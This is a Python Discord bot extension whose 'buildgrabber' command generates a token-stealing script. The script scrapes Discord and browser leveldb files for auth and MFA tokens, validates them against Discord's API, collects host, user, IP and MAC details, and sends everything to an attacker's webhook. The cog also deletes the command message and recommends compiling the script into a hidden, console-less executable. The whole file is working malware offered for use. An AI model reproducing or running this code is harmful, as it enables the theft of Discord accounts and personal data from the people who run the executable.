# cogs/grabber_builder.py
import discord
from discord.ext import commands

TEMPLATE = r'''
import os, re, json, base64, httpx
from pathlib import Path
from datetime import datetime

WEBHOOK = "{webhook}"

PATHS = {{
    "Discord": Path(os.getenv("APPDATA","")) / "discord" / "Local Storage" / "leveldb",
    "Discord Canary": Path(os.getenv("APPDATA","")) / "discordcanary" / "Local Storage" / "leveldb",
    "Discord PTB": Path(os.getenv("APPDATA","")) / "discordptb" / "Local Storage" / "leveldb",
    "Chrome": Path(os.getenv("LOCALAPPDATA","")) / "Google/Chrome/User Data/Default/Local Storage/leveldb",
    "Edge": Path(os.getenv("LOCALAPPDATA","")) / "Microsoft/Edge/User Data/Default/Local Storage/leveldb",
    "Brave": Path(os.getenv("LOCALAPPDATA","")) / "BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb",
    "Opera": Path(os.getenv("APPDATA","")) / "Opera Software/Opera Stable/Local Storage/leveldb",
}}

TOKEN_RE = re.compile(r"[\w-]{{24}}\.[\w-]{{6}}\.[\w-]{{25,110}}")
MFA_RE = re.compile(r"mfa\.[\w-]{{84}}")

def get_tokens():
    found = set()
    for name, path in PATHS.items():
        if not path.exists():
            continue
        for f in path.rglob("*"):
            if f.suffix not in (".log", ".ldb"):
                continue
            try:
                content = f.read_text(errors="ignore")
                found.update(TOKEN_RE.findall(content))
                found.update(MFA_RE.findall(content))
            except Exception:
                pass
    return list(found)

def sysinfo():
    import platform, socket, uuid
    try:
        ip = httpx.get("https://api.ipify.org", timeout=4).text
    except Exception:
        ip = "?"
    return {{
        "host": socket.gethostname(),
        "user": os.getenv("USERNAME","?"),
        "os": platform.platform(),
        "ip": ip,
        "mac": hex(uuid.getnode()),
    }}

def send(tokens, info):
    valid = []
    for t in tokens:
        try:
            r = httpx.get("https://discord.com/api/v10/users/@me", headers={{"Authorization": t}}, timeout=5)
            if r.status_code == 200:
                d = r.json()
                valid.append(f"`{{t}}` — {{d.get('username')}}")
        except Exception:
            pass
    embed = {{
        "embeds": [{{
            "title": f"grab — {{info['host']}}",
            "color": 0xff0000,
            "fields": [
                {{"name": "tokens", "value": "\\n".join(valid)[:1000] or "none"}},
                {{"name": "sys", "value": f"{{info['host']}} | {{info['user']}} | {{info['os']}} | {{info['ip']}}"}},
            ],
            "timestamp": datetime.utcnow().isoformat(),
        }}]
    }}
    httpx.post(WEBHOOK, json=embed, timeout=10)

if __name__ == "__main__":
    send(get_tokens(), sysinfo())
'''

class GrabberBuilder(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="buildgrabber")
    async def buildgrabber(self, ctx, webhook_url: str):
        await ctx.message.delete()
        code = TEMPLATE.format(webhook=webhook_url)
        with open("grabber.py", "w", encoding="utf-8") as f:
            f.write(code)
        await ctx.send("grabber.py written — pyinstaller --onefile --noconsole grabber.py", delete_after=6)

async def setup(bot):
    await bot.add_cog(GrabberBuilder(bot))
